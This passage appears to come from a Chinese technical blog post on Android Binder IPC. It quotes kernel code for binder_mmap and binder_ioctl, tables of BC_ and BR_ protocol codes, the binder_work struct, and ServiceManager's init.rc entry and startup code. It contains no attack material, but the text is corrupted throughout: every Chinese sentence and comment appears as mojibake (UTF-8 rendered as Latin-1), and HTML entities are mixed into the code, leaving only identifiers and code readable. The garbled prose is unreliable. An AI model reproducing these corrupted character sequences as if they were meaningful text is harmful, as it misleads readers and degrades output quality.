ä¸ºè¿›ç¨‹åˆ†é…å†…æ ¸ç¼“å†²åŒºï¼Œå¹¶å°†è¿™å—ç‰©ç†å†…å­˜åˆ†åˆ«æ˜ å°„åˆ°å†…æ ¸è™šæ‹Ÿåœ°å€ç©ºé—´å’Œç”¨æˆ·è™šæ‹Ÿå†…å­˜ç©ºé—´ ret = binder_alloc_mmap_handler(&amp;proc->alloc, vma); if (ret) return ret; mutex_lock(&amp;proc->files_lock); proc->files = get_files_struct(current); mutex_unlock(&amp;proc->files_lock); return 0;err_bad_arg: pr_err(\"%s: %d %lx-%lx %s failed %d\\n\", __func__, proc->pid, vma->vm_start, vma->vm_end, failure_string, ret); return ret;&#125;Binder é©±åŠ¨ç¨‹åºä¸ºè¿›ç¨‹åˆ†é…çš„å†…æ ¸ç¼“å†²åŒºå³ä¸ºä¸€ç³»åˆ—ç‰©ç†é¡µé¢ï¼Œä»–ä»¬åˆ†åˆ«è¢«æ˜ å°„åˆ°è¿›ç¨‹çš„ç”¨æˆ·åœ°å€ç©ºé—´å’Œå†…æ ¸åœ°å€ç©ºé—´ã€‚å½“ Binder é©±åŠ¨ç¨‹åºéœ€è¦å°†ä¸€å—æ•°æ®ä¼ è¾“ç»™ä¸€ä¸ªè¿›ç¨‹æ—¶ï¼Œå®ƒå¯ä»¥å…ˆæŠŠè¿™å—æ•°æ®ä¿å­˜åœ¨ä¸ºè¯¥è¿›ç¨‹åˆ†é…æ‰€åˆ†é…çš„ä¸€å—å†…æ ¸ç¼“å†²åŒºä¸­ï¼Œç„¶åå†æŠŠè¿™å—å†…æ ¸ç¼“å†²åŒºçš„ç”¨æˆ·ç©ºé—´åœ°å€å‘Šè¯‰è¿›ç¨‹ï¼Œæœ€åè¿›ç¨‹å°±å¯ä»¥è®¿é—®åˆ°é‡Œé¢çš„æ•°æ®äº†ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯ä¸éœ€è¦å°†å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œä»è€Œæé«˜äº†æ•°æ®ä¼ è¾“çš„æ•ˆç‡. # binder è®¾å¤‡æ–‡ä»¶çš„ ioctl binder_ioctl å‡½æ•°è´Ÿè´£åœ¨ä¸¤ä¸ªè¿›ç¨‹é—´æ”¶å‘ IPC æ•°æ®å’Œ IPC reply æ•°æ®ã€‚ ioctl (input/output control) æ˜¯ä¸€ä¸ªä¸“ç”¨äºè®¾å¤‡è¾“å…¥è¾“å‡ºæ“ä½œçš„ç³»ç»Ÿè°ƒç”¨ï¼Œè¯¥è°ƒç”¨ä¼ å…¥ä¸€ä¸ªè·Ÿè®¾å¤‡æœ‰å…³çš„è¯·æ±‚ç ï¼Œç³»ç»Ÿè°ƒç”¨çš„åŠŸèƒ½å®Œå…¨å–å†³äºè¯·æ±‚ç ã€‚ ioctl å‘½ä»¤ æ•°æ®ç±»å‹ æ“ä½œ ä½¿ç”¨åœºæ™¯ BINDER_WRITE_READ struct binder_write_read æ”¶å‘ Binder IPC æ•°æ® Binder è¯»å†™äº¤äº’åœºæ™¯ï¼ŒIPC.talkWithDriver BINDER_SET_IDLE_TIMEOUT __s64 BINDER_SET_MAX_THREADS __u32 è®¾ç½® Binder çº¿ç¨‹æœ€å¤§ä¸ªæ•° åˆå§‹åŒ– ProcessState å¯¹è±¡ï¼Œopen_driver () ; ä¸»åŠ¨è°ƒæ•´å‚æ•°ï¼ŒProcessState.setThreadPoolMaxThreadCount () BINDER_SET_IDLE_PRIORITY __s32 BINDER_SET_CONTEXT_MGR __s32 è®¾ç½® Service Manager èŠ‚ç‚¹ servicemanager è¿›ç¨‹æˆä¸ºä¸Šä¸‹æ–‡ç®¡ç†è€…ï¼Œbinder_become_context_manager () BINDER_THREAD_EXIT __s32 é‡Šæ”¾ Binder çº¿ç¨‹ BINDER_VERSION struct binder_version è·å– Binder ç‰ˆæœ¬ä¿¡æ¯ åˆå§‹åŒ– ProcessState å¯¹è±¡ï¼Œopen_driver () BINDER_GET_NODE_DEBUG_INFO struct binder_node_debug_info BINDER_GET_NODE_INFO_FOR_REF struct binder_node_info_for_ref BINDER_SET_CONTEXT_MGR_EXT struct flat_binder_object //kernel\\drivers\\android\\binder.cstatic long binder_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)&#123; int ret; struct binder_proc *proc = filp->private_data; struct binder_thread *thread; unsigned int size = _IOC_SIZE(cmd); void __user *ubuf = (void __user *)arg; /*pr_info(\"binder_ioctl: %d:%d %x %lx\\n\", proc->pid, current->pid, cmd, arg);*/ binder_selftest_alloc(&amp;proc->alloc); trace_binder_ioctl(cmd, arg); ret = wait_event_interruptible(binder_user_error_wait, binder_stop_on_user_error &lt; 2); if (ret) goto err_unlocked; thread = binder_get_thread(proc); if (thread == NULL) &#123; ret = -ENOMEM; goto err; &#125; switch (cmd) &#123; // è¿›è¡Œ binder çš„è¯»å†™æ“ä½œï¼Œè¿™ä¸ªå‘½ä»¤ä½¿ç”¨çš„æœ€ä¸ºé¢‘ç¹ case BINDER_WRITE_READ: ret = binder_ioctl_write_read(filp, cmd, arg, thread); if (ret) goto err; break; // è®¾ç½® binder æœ€å¤§æ”¯æŒçš„çº¿ç¨‹æ•° case BINDER_SET_MAX_THREADS: &#123; int max_threads; if (copy_from_user(&amp;max_threads, ubuf, sizeof(max_threads))) &#123; ret = -EINVAL; goto err; &#125; binder_inner_proc_lock(proc); proc->max_threads = max_threads; binder_inner_proc_unlock(proc); break; &#125; case BINDER_SET_CONTEXT_MGR_EXT: &#123; struct flat_binder_object fbo; if (copy_from_user(&amp;fbo, ubuf, sizeof(fbo))) &#123; ret = -EINVAL; goto err; &#125; ret = binder_ioctl_set_ctx_mgr(filp, &amp;fbo); if (ret) goto err; break; &#125; // æˆä¸º binder çš„ä¸Šä¸‹æ–‡ç®¡ç†è€…ï¼Œä¹Ÿå°±æ˜¯ ServiceManager æˆä¸ºå®ˆæŠ¤è¿›ç¨‹ case BINDER_SET_CONTEXT_MGR: ret = binder_ioctl_set_ctx_mgr(filp, NULL); if (ret) goto err; break; // å½“ binder çº¿ç¨‹é€€å‡ºï¼Œé‡Šæ”¾ binder çº¿ç¨‹ case BINDER_THREAD_EXIT: binder_debug(BINDER_DEBUG_THREADS, \"%d:%d exit\\n\", proc->pid, thread->pid); binder_thread_release(proc, thread); thread = NULL; break; // è·å– binder çš„ç‰ˆæœ¬å· case BINDER_VERSION: &#123; struct binder_version __user *ver = ubuf; if (size != sizeof(struct binder_version)) &#123; ret = -EINVAL; goto err; &#125; if (put_user(BINDER_CURRENT_PROTOCOL_VERSION, &amp;ver->protocol_version)) &#123; ret = -EINVAL; goto err; &#125; break; &#125; case BINDER_GET_NODE_INFO_FOR_REF: &#123; struct binder_node_info_for_ref info; if (copy_from_user(&amp;info, ubuf, sizeof(info))) &#123; ret = -EFAULT; goto err; &#125; ret = binder_ioctl_get_node_info_for_ref(proc, &amp;info); if (ret &lt; 0) goto err; if (copy_to_user(ubuf, &amp;info, sizeof(info))) &#123; ret = -EFAULT; goto err; &#125; break; &#125; case BINDER_GET_NODE_DEBUG_INFO: &#123; struct binder_node_debug_info info; if (copy_from_user(&amp;info, ubuf, sizeof(info))) &#123; ret = -EFAULT; goto err; &#125; ret = binder_ioctl_get_node_debug_info(proc, &amp;info); if (ret &lt; 0) goto err; if (copy_to_user(ubuf, &amp;info, sizeof(info))) &#123; ret = -EFAULT; goto err; &#125; break; &#125; default: ret = -EINVAL; goto err; &#125; ret = 0;err: if (thread) thread->looper_need_return = false; wait_event_interruptible(binder_user_error_wait, binder_stop_on_user_error &lt; 2); if (ret &amp;&amp; ret != -ERESTARTSYS) pr_info(\"%d:%d ioctl %x %lx returned %d\\n\", proc->pid, current->pid, cmd, arg, ret);err_unlocked: trace_binder_ioctl_done(ret); return ret;&#125;# Binder å†…éƒ¨é€šä¿¡åè®® Client è¿›ç¨‹é€šè¿‡ RPC (Remote Procedure Call Protocol) ä¸ Server é€šä¿¡ï¼Œå¯ä»¥ç®€å•åœ°åˆ’åˆ†ä¸ºä¸‰å±‚ï¼Œåº”ç”¨å±‚ã€IPC å±‚ã€å†…æ ¸é©±åŠ¨å±‚ã€‚ demo() æ˜¯ Client ç«¯å’Œ Server å…±åŒåå•†å¥½çš„ç»Ÿä¸€æ–¹æ³•ï¼›handleã€RPC æ•°æ®ã€ä»£ç ã€åè®®è¿™ 4 é¡¹ç»„æˆäº† IPC å±‚çš„æ•°æ®ï¼Œé€šè¿‡ IPC å±‚è¿›è¡Œæ•°æ®ä¼ è¾“ï¼›è€ŒçœŸæ­£åœ¨ Client å’Œ Server ä¸¤ç«¯å»ºç«‹é€šä¿¡çš„åŸºç¡€è®¾æ–½ä¾¿æ˜¯ Binder Driverã€‚ # é€šä¿¡æ¨¡å‹ ä¸€æ¬¡å®Œæ•´çš„ Binder é€šä¿¡è¿‡ç¨‹å¦‚ä¸‹ Binder åè®®åŒ…å«åœ¨ IPC æ•°æ®ä¸­ï¼Œåˆ†ä¸ºä¸¤ç±»: BINDER_COMMAND_PROTOCOL ï¼šbinder è¯·æ±‚ç ï¼Œä»¥â€BC_â€œå¼€å¤´ï¼Œç®€ç§° BC ç ï¼Œç”¨äºä» IPC å±‚ä¼ é€’åˆ° Binder Driver å±‚ï¼› BINDER_RETURN_PROTOCOL ï¼šbinder å“åº”ç ï¼Œä»¥â€BR_â€œå¼€å¤´ï¼Œç®€ç§° BR ç ï¼Œç”¨äºä» Binder Driver å±‚ä¼ é€’åˆ° IPC å±‚ï¼› Binder IPC é€šä¿¡è‡³å°‘æ˜¯ä¸¤ä¸ªè¿›ç¨‹çš„äº¤äº’ï¼š client è¿›ç¨‹æ‰§è¡Œ binder_thread_writeï¼Œæ ¹æ® BC_XXX å‘½ä»¤ï¼Œç”Ÿæˆç›¸åº”çš„ binder_workï¼› server è¿›ç¨‹æ‰§è¡Œ binder_thread_readï¼Œæ ¹æ® binder_work.type ç±»å‹ï¼Œç”Ÿæˆ BR_XXXï¼Œå‘é€åˆ°ç”¨æˆ·ç©ºé—´å¤„ç†ã€‚ # é€šä¿¡è¿‡ç¨‹ ä¸€æ¬¡ Client å‘ Server é€šä¿¡çš„è¿‡ç¨‹å¦‚å›¾æ‰€ç¤º # BC_PROTOCOL binder è¯·æ±‚ç ï¼Œæ˜¯ç”¨ enum binder_driver_command_protocol æ¥å®šä¹‰çš„ï¼Œæ˜¯ç”¨äºåº”ç”¨ç¨‹åºå‘ binder é©±åŠ¨è®¾å¤‡å‘é€è¯·æ±‚æ¶ˆæ¯ è¯·æ±‚ç  å‚æ•°ç±»å‹ ä½œç”¨ BC_TRANSACTION binder_transaction_data Client å‘ Binder é©±åŠ¨å‘é€è¯·æ±‚æ•°æ® BC_REPLY binder_transaction_data Server å‘ Binder é©±åŠ¨å‘é€è¯·æ±‚æ•°æ® BC_FREE_BUFFER binder_uintptr_t (æŒ‡é’ˆ) é‡Šæ”¾å†…å­˜ BC_INCREFS __u32(descriptor) binder_ref å¼±å¼•ç”¨åŠ  1 æ“ä½œ BC_DECREFS __u32(descriptor) binder_ref å¼±å¼•ç”¨å‡ 1 æ“ä½œ BC_ACQUIRE __u32(descriptor) binder_ref å¼ºå¼•ç”¨åŠ  1 æ“ä½œ BC_RELEASE __u32(descriptor) binder_ref å¼ºå¼•ç”¨å‡ 1 æ“ä½œ BC_ACQUIRE_DONE binder_ptr_cookie binder_node å¼ºå¼•ç”¨å‡ 1 æ“ä½œ BC_INCREFS_DONE binder_ptr_cookie binder_node å¼±å¼•ç”¨å‡ 1 æ“ä½œ BC_REGISTER_LOOPER æ— å‚æ•° åˆ›å»ºæ–°çš„ looper çº¿ç¨‹ BC_ENTER_LOOPER æ— å‚æ•° åº”ç”¨çº¿ç¨‹è¿›å…¥ looper BC_EXIT_LOOPER æ— å‚æ•° åº”ç”¨çº¿ç¨‹é€€å‡º looper BC_REQUEST_DEATH_NOTIFICATION binder_handle_cookie æ³¨å†Œæ­»äº¡é€šçŸ¥ BC_CLEAR_DEATH_NOTIFICATION binder_handle_cookie å–æ¶ˆæ³¨å†Œçš„æ­»äº¡é€šçŸ¥ BC_DEAD_BINDER_DONE binder_uintptr_t (æŒ‡é’ˆ) å·²å®Œæˆ binder çš„æ­»äº¡é€šçŸ¥ BC_ACQUIRE_RESULT - - BC_ATTEMPT_ACQUIRE - - å½“ä¸€ä¸ªè¿›ç¨‹è¯·æ±‚å¦å¤–ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œä¸€ä¸ªæ“ä½œæ—¶ï¼Œæºè¿›ç¨‹å°±ä½¿ç”¨ BC_TRANSACTION æ¥è¯·æ±‚ Binder é©±åŠ¨è¿›ç¨‹å°†é€šä¿¡æ•°æ®ä¼ é€’åˆ°ç›®æ ‡è¿›ç¨‹ å½“ç›®æ ‡è¿›ç¨‹å¤„ç†å®Œæˆæºè¿›ç¨‹æ‰€è¯·æ±‚çš„æ“ä½œä¹‹åï¼Œå®ƒå°±ä½¿ç”¨ BC_REPLY æ¥è¯·æ±‚ Binder é©±åŠ¨è¿›ç¨‹å°†ç»“æœæ•°æ®ä¼ é€’ç»™æºè¿›ç¨‹ BC_FREE_BUFFER åé¢è·Ÿçš„é€šä¿¡æ•°æ®æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œå®ƒæŒ‡å‘äº†åœ¨ Binder é©±åŠ¨è¿›ç¨‹å†…éƒ¨æ‰€åˆ†é…çš„ä¸€å—å†…æ ¸ç¼“å†²åŒº.Binder é©±åŠ¨ç¨‹åºå°±æ˜¯é€šè¿‡è¿™ä¸ªå†…æ ¸ç¼“å†²åŒºå°†æºè¿›ç¨‹çš„é€šä¿¡æ•°æ®ä¼ é€’åˆ°ç›®æ ‡è¿›ç¨‹çš„ã€‚å½“ç›®æ ‡è¿›ç¨‹å¤„ç†å®Œæˆæºè¿›ç¨‹çš„é€šä¿¡è¯·æ±‚ä¹‹åï¼Œå®ƒä¼šä½¿ç”¨ BC_FREE_BUFFER æ¥é€šçŸ¥ Binder é©±åŠ¨ç¨‹åºé‡Šæ”¾è¿™ä¸ªå†…æ ¸ç¼“å†²åŒº å½“ä¸€ä¸ªçº¿ç¨‹å°†è‡ªå·±æ³¨å†Œåˆ° Binder é©±åŠ¨ç¨‹åºä¹‹åï¼Œå®ƒä¼šä½¿ç”¨ BC_ENTER_LOOPER æ¥é€šçŸ¥ Binder é©±åŠ¨ç¨‹åºï¼Œå®ƒå·²ç»å‡†å¤‡å°±ç»ªå¤„ç†è¿›ç¨‹é—´é€šä¿¡è¯·æ±‚äº† å½“ Binder é©±åŠ¨ç¨‹åºä¸»åŠ¨è¯·æ±‚è¿›ç¨‹æ³¨å†Œä¸€ä¸ªæ–°çš„çº¿ç¨‹åˆ°å®ƒçš„ Binder çº¿ç¨‹æ± ä¸­æ¥å¤„ç†è¿›ç¨‹é—´é€šä¿¡è¯·æ±‚ä¹‹åï¼Œæ–°åˆ›å»ºçš„çº¿ç¨‹å°±ä¼šä½¿ç”¨ BC_REGISTER_LOOPER æ¥é€šçŸ¥ Binder é©±åŠ¨ç¨‹åºï¼Œå®ƒå‡†å¤‡å°±ç»ªäº† å½“ä¸€ä¸ªçº¿ç¨‹è¦é€€å‡ºæ—¶ï¼Œå®ƒä½¿ç”¨ BC_EXIT_LOOPER ä» Binder é©±åŠ¨ç¨‹åºä¸­æ³¨é”€ï¼Œè¿™æ ·ä»–å°±ä¸ä¼šå†æ¥æ”¶åˆ°è¿›ç¨‹é—´é€šä¿¡è¯·æ±‚äº† å¦‚æœä¸€ä¸ªè¿›ç¨‹å¸Œæœ›è·å¾—å®ƒæ‰€å¼•ç”¨çš„ Service ç»„ä»¶çš„æ­»äº¡æ¥æ”¶é€šçŸ¥ï¼Œé‚£ä¹ˆå®ƒéœ€è¦ä½¿ç”¨ BC_REQUEST_DEATH_NOTIFICATION æ¥å‘ Binder é©±åŠ¨ç¨‹åºæ³¨å†Œä¸€ä¸ªæ­»äº¡æ¥æ”¶é€šçŸ¥ å¦‚æœä¸€ä¸ªè¿›ç¨‹å¸Œæœ›æ³¨é”€ä¹‹å‰æ‰€æ³¨å†Œçš„ä¸€ä¸ªæ­»äº¡æ¥æ”¶é€šçŸ¥ï¼Œé‚£ä¹ˆå®ƒéœ€è¦ä½¿ç”¨ BC_CLEAR_DEATH_NOTIFICATION æ¥å‘ Binder é©±åŠ¨ç¨‹åºå‘å‡ºè¯·æ±‚ å½“ä¸€ä¸ªè¿›ç¨‹è·å¾—ä¸€ä¸ª Service ç»„ä»¶çš„æ­»äº¡é€šçŸ¥æ—¶ï¼Œå®ƒä¼šä½¿ç”¨ BC_DEAD_BINDER_DONE æ¥é€šçŸ¥ Binder é©±åŠ¨ç¨‹åºï¼Œå®ƒå·²ç»å¤„ç†å®Œæˆè¯¥ Service ç»„ä»¶çš„æ­»äº¡é€šçŸ¥äº† # binder_work ç»“æ„ä½“ binder_work ç”¨æ¥æè¿°å¾…å¤„ç†çš„å·¥ä½œé¡¹ï¼Œ binder_work.entry ç”¨æ¥å°†ç»“æ„ä½“åµŒå…¥åˆ°ä¸€ä¸ªå®¿ä¸»ç»“æ„ä¸­ï¼Œé€šè¿‡ binder_work.type çš„å–å€¼ï¼ŒBinder å°±å¯ä»¥åˆ¤æ–­å‡ºä¸€ä¸ª binder_work ç»“æ„ä½“åµŒå…¥åˆ°ä»€ä¹ˆç±»å‹çš„å®¿ä¸»ç»“æ„ä¸­ struct binder_work &#123; struct list_head entry; enum binder_work_type &#123; BINDER_WORK_TRANSACTION = 1,// æœ€å¸¸è§ BINDER_WORK_TRANSACTION_COMPLETE, BINDER_WORK_RETURN_ERROR, BINDER_WORK_NODE, BINDER_WORK_DEAD_BINDER, BINDER_WORK_DEAD_BINDER_AND_CLEAR, BINDER_WORK_CLEAR_DEATH_NOTIFICATION, &#125; type;&#125;; binder_work ç±»å‹ è§¦å‘æ—¶æœº BINDER_WORK_TRANSACTION binder_transaction() ; binder_release_work() è¢«è°ƒç”¨ BINDER_WORK_TRANSACTION_COMPLETE binder_transaction() ; binder_release_work() è¢«è°ƒç”¨ BINDER_WORK_NODE binder_new_node() è¢«è°ƒç”¨ BINDER_WORK_DEAD_BINDER binder_thread_write() æ”¶åˆ° BC_REQUEST_DEATH_NOTIFICATION BINDER_WORK_DEAD_BINDER_AND_CLEAR binder_thread_write() æ”¶åˆ° BC_CLEAR_DEATH_NOTIFICATION BINDER_WORK_CLEAR_DEATH_NOTIFICATION binder_thread_write() æ”¶åˆ° BC_CLEAR_DEATH_NOTIFICATION å’Œ BC_DEAD_BINDER_DONE # BR_PROTOCOL binder å“åº”ç ï¼Œæ˜¯ç”¨ enum binder_driver_return_protocol æ¥å®šä¹‰çš„ï¼Œæ˜¯ binder è®¾å¤‡å‘åº”ç”¨ç¨‹åºå›å¤çš„æ¶ˆæ¯ å“åº”ç  å‚æ•°ç±»å‹ ä½œç”¨ è§¦å‘æ—¶æœº BR_ERROR __s32 æ“ä½œå‘ç”Ÿé”™è¯¯ BR_OK æ— å‚æ•° æ“ä½œå®Œæˆ BR_NOOP æ— å‚æ•° ä¸åšä»»ä½•äº‹ BR_SPAWN_LOOPER æ— å‚æ•° åˆ›å»ºæ–°çš„ Looper çº¿ç¨‹ BR_TRANSACTION binder_transaction_data Binder é©±åŠ¨å‘ Server ç«¯å‘é€è¯·æ±‚æ•°æ® æ”¶åˆ° BINDER_WORK_TRANSACTION BR_REPLY binder_transaction_data Binder é©±åŠ¨å‘ Client ç«¯å‘é€å›å¤æ•°æ® æ”¶åˆ° BINDER_WORK_TRANSACTION BR_TRANSACTION_COMPLETE æ— å‚æ•° å¯¹è¯·æ±‚å‘é€çš„æˆåŠŸåé¦ˆ æ”¶åˆ° BINDER_WORK_TRANSACTION_COMPLETE BR_DEAD_REPLY æ— å‚æ•° å›å¤å¤±è´¥ï¼Œå¾€å¾€æ˜¯çº¿ç¨‹æˆ–èŠ‚ç‚¹ä¸ºç©º BR_FAILED_REPLY æ— å‚æ•° å›å¤å¤±è´¥ï¼Œå¾€å¾€æ˜¯ transaction å‡ºé”™å¯¼è‡´ BR_INCREFS binder_ptr_cookie binder_ref å¼±å¼•ç”¨åŠ  1 æ“ä½œï¼ˆServer ç«¯ï¼‰ BR_DECREFS binder_ptr_cookie binder_ref å¼±å¼•ç”¨å‡ 1 æ“ä½œï¼ˆServer ç«¯ï¼‰ BR_ACQUIRE binder_ptr_cookie binder_ref å¼ºå¼•ç”¨åŠ  1 æ“ä½œï¼ˆServer ç«¯ï¼‰ BR_RELEASE binder_ptr_cookie binder_ref å¼ºå¼•ç”¨å‡ 1 æ“ä½œï¼ˆServer ç«¯ï¼‰ BR_DEAD_BINDER binder_uintptr_t (æŒ‡é’ˆ) Binder é©±åŠ¨å‘ client ç«¯å‘é€æ­»äº¡é€šçŸ¥ æ”¶åˆ° BINDER_WORK_DEAD_BINDER æˆ– BINDER_WORK_DEAD_BINDER_AND_CLEAR BR_CLEAR_DEATH_NOTIFICATION_DONE binder_uintptr_t (æŒ‡é’ˆ) BC_CLEAR_DEATH_NOTIFICATION å‘½ä»¤å¯¹åº”çš„å“åº”ç  æ”¶åˆ° BINDER_WORK_CLEAR_DEATH_NOTIFICATION BR_ACQUIRE_RESULT - - BR_ATTEMPT_ACQUIRE - - BR_FINISHED - - # åè®®è½¬æ¢å›¾ BINDER_WORK_xxx â€“&gt; BW_xxx å›¾è§£ï¼š(ä»¥ BC_TRANSACTION ä¸ºä¾‹) å‘èµ·ç«¯è¿›ç¨‹ï¼šbinder_transaction () è¿‡ç¨‹å°† BC_TRANSACTION è½¬æ¢ä¸º BW_TRANSACTIONï¼› æ¥æ”¶ç«¯è¿›ç¨‹ï¼šbinder_thread_read () è¿‡ç¨‹ï¼Œå°† BW_TRANSACTION è½¬æ¢ä¸º BR_TRANSACTION; æ¥æ”¶ç«¯è¿›ç¨‹ï¼šIPC.executeCommand () è¿‡ç¨‹ï¼Œå¤„ç† BR_TRANSACTION å‘½ä»¤ã€‚ # ServiceManager ä»‹ç» æˆ‘ä»¬çŸ¥é“åœ¨ Android ç³»ç»Ÿä¸­ï¼Œå„ä¸ªè¿›ç¨‹ä¹‹é—´éƒ½æ˜¯éš”ç¦»çš„ï¼Œå‡å¦‚ Clinet æƒ³å’Œ Server é€šä¿¡ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•æ‰¾åˆ° Server å‘¢ï¼Ÿè¿™å°±éœ€è¦ä¾é  ServiceManager äº† ServiceManager æ˜¯ Android è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ Binder çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œå®ƒæ‰®æ¼”ç€ Binder è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ä¸Šä¸‹æ–‡ç®¡ç†è€… (context Manager) çš„è§’è‰²ï¼ŒåŒæ—¶è´Ÿè´£ç®¡ç†ç³»ç»Ÿä¸­çš„ Service ç»„ä»¶ï¼Œå‘ Client ç»„ä»¶æä¾›è·å– Service ä»£ç†å¯¹è±¡çš„æœåŠ¡ æˆ‘ä»¬å¯ä»¥å°† binder è·¨è¿›ç¨‹é€šä¿¡å’Œ socket ç½‘ç»œé€šä¿¡ç±»æ¯”ï¼Œåœ¨ç½‘ç»œé€šä¿¡ä¸­ï¼Œå®¢æˆ·ç«¯å¹¶ä¸çŸ¥é“æœåŠ¡å™¨çš„ IP åœ°å€ï¼Œä½†æ˜¯çŸ¥é“æœåŠ¡å™¨çš„åŸŸåï¼Œç°åœ¨å®¢æˆ·ç«¯æƒ³è¦å’ŒæœåŠ¡å™¨å»ºç«‹ socket è¿æ¥ï¼Œé‚£ä¹ˆé€šä¿¡çš„ç¬¬ä¸€æ­¥å°±æ˜¯é€šè¿‡ DNS æœåŠ¡å™¨å°†åŸŸåè§£æä¸º IP åœ°å€ç„¶åå±‚å±‚è·¯ç”±ï¼Œè¿™æ ·å®¢æˆ·ç«¯å°±å¯ä»¥å’ŒæœåŠ¡å™¨å»ºç«‹ç½‘ç»œè¿æ¥äº†ã€‚binder è·¨è¿›ç¨‹é€šä¿¡ä¹Ÿä¸ä¾‹å¤–ï¼ŒServiceManager å°±ç›¸å½“äºæ˜¯ socket ç½‘ç»œé€šä¿¡ä¸­çš„ DNS æœåŠ¡å™¨ï¼Œå€˜è‹¥ Server å¸Œæœ›æœ‰äººèƒ½å¤Ÿå’Œå®ƒé€šä¿¡ï¼Œé‚£ä¹ˆ Server å°±å…ˆå‰å¾€ Service Manager é‚£é‡Œ â€œå¤‡æ¡ˆâ€ ä¸€ä¸‹ï¼ˆ1. æ³¨å†ŒæœåŠ¡ï¼‰ï¼Œè¿‡äº†ä¸ä¹…ï¼ŒClient æƒ³è¦å’Œ Server å»é€šä¿¡äº†ï¼Œå®ƒå°±å»è¯¢é—® Service Managerï¼šâ€œServer åœ¨ä»€ä¹ˆåœ°æ–¹å‘€ï¼Œæˆ‘è¦æ€ä¹ˆå’Œå®ƒé€šä¿¡å‘€â€ï¼ˆ2. è·å–æœåŠ¡ï¼‰ï¼Œç„¶å Service Manager å°±å‘Šè¯‰ Client é€šä¿¡çš„æ–¹æ³•ï¼Œè¿™æ · Clinet å’Œ Server å°±å¯ä»¥æ„‰å¿«çš„é€šä¿¡äº†ï½ï¼ˆ3. ä½¿ç”¨æœåŠ¡ï¼‰ # ServiceManager çš„å¯åŠ¨è¿‡ç¨‹ ServiceManager æ˜¯ç”± init è¿›ç¨‹é€šè¿‡è§£æ init.rc æ–‡ä»¶åˆ›å»ºçš„ # platform\\system\\core\\rootdir\\init.rc on init ... # Start essential services. start servicemanager å…·ä½“çš„æœåŠ¡å£°æ˜åœ¨ platform\\frameworks\\native\\cmds\\servicemanager\\servicemanager.rc # platform\\frameworks\\native\\cmds\\servicemanager\\servicemanager.rc service servicemanager /system/bin/servicemanager class core animation# æŒ‡å®šäº†æœåŠ¡çš„ç±»åˆ«ä¸ºcoreå’Œanimation user system# æŒ‡å®šäº†æœåŠ¡ç”¨æˆ·ä¸ºsystem,è¡¨ç¤ºè¯¥æœåŠ¡å°†ä»¥ç³»ç»Ÿç”¨æˆ·çš„æƒé™æ¥è¿è¡Œ group system readproc# æŒ‡å®šäº†æœåŠ¡çš„ç”¨æˆ·ç»„ä¸ºsystem,å¹¶å…·æœ‰ readproc æƒé™ critical# æ ‡å¿—è¯¥æœåŠ¡ä¸ºå…³é”®æœåŠ¡ï¼Œè¿™è¡¨ç¤ºå®ƒæ˜¯ç³»ç»Ÿå¯åŠ¨çš„ä¸€éƒ¨åˆ†ï¼Œå¿…é¡»ä¼˜å…ˆå¯åŠ¨ # è¦æ±‚åœ¨servicemanageré‡æ–°å¯åŠ¨æ—¶é‡å¯ # apexdæœåŠ¡, audioserveræœåŠ¡, gatekeeperdæœåŠ¡ # mainç±»åˆ«çš„æœåŠ¡, halç±»åˆ«çš„æœåŠ¡, early_halç±»åˆ«çš„æœåŠ¡ onrestart restart apexd onrestart restart audioserver onrestart restart gatekeeperd onrestart class_restart main onrestart class_restart hal onrestart class_restart early_hal # å°† servicemanager çš„è¿›ç¨‹ ID å†™å…¥ # /dev/cpuset/system-background/tasksæ–‡ä»¶ï¼Œè¿™å¯ç”¨äºCPUé›†åˆç®¡ç† writepid /dev/cpuset/system-background/tasks # å£°æ˜è¯¥æœåŠ¡ä¸ºå…³é”®æœåŠ¡ï¼Œåœ¨ç³»ç»Ÿå…³é—­æ—¶ï¼Œè¿™ä¸ªæœåŠ¡å°†è¢«ä¼˜å…ˆå…³é—­ shutdown critical Service Manager çš„å…¥å£å‡½æ•°æ˜¯ main.cpp ä¸­çš„ main() , å®ƒçš„å¯åŠ¨è¿‡ç¨‹ç”±ä»¥ä¸‹å››ä¸ªæ­¥éª¤ç»„æˆ è°ƒç”¨ ProcessState::initWithDriver æ‰“å¼€å¹¶æ˜ å°„ binder é©±åŠ¨è®¾å¤‡ å°†è‡ªèº«ä½œä¸ºæœåŠ¡ (æœåŠ¡åç§°: manager ) æ³¨å†Œåˆ° ServiceManager ä¸­ è°ƒç”¨ ps-&gt;becomeContextManager(); æˆä¸º binder è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶çš„ä¸Šä¸‹æ–‡ç®¡ç†è€… ä½¿ç”¨ looper æ— é™å¾ªç¯é˜»å¡å¤„ç†äº‹ä»¶ //platform\\frameworks\\native\\cmds\\servicemanager\\main.cppint main(int argc, char** argv) &#123; if (argc > 2) &#123; LOG(FATAL) &lt;&lt; \"usage: \" &lt;&lt; argv[0] &lt;&lt; \" [binder driver]\"; &#125; // æŒ‡å®š driver çš„åç§°ï¼Œå¦‚æœæ— å‚æ•°ï¼Œåˆ™ä½¿ç”¨é»˜è®¤é©±åŠ¨ /dev/binder const char* driver = argc == 2 ? argv[1] : \"/dev/binder\"; /* æ¯ä¸€ä¸ªè¿›ç¨‹åªèƒ½æœ‰ä¸€ä¸ª ProcessState å¯¹è±¡ï¼Œservice manager é€šè¿‡ initWithDriver æ–¹æ³• å®ä¾‹åŒ–äº†ä¸€ä¸ª ProcessState å¯¹è±¡ï¼Œå¹¶æ‰“å¼€ binder è®¾å¤‡å’Œè¿›è¡Œ mmap å†…å­˜æ˜ å°„ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ å°†ä¼šåŒæ—¶è°ƒç”¨ binder è®¾å¤‡å†…éƒ¨çš„å‡½æ•° binder_open å’Œ binder_mmap */ sp&lt;ProcessState> ps = ProcessState::initWithDriver(driver); // è®¾ç½®å¯ä»¥åŒæ—¶å­˜åœ¨çš„çº¿ç¨‹æ± çš„æœ€å¤§æ•°é‡ä¸º 0, å³æ­¤æ—¶åªèƒ½æœ‰ 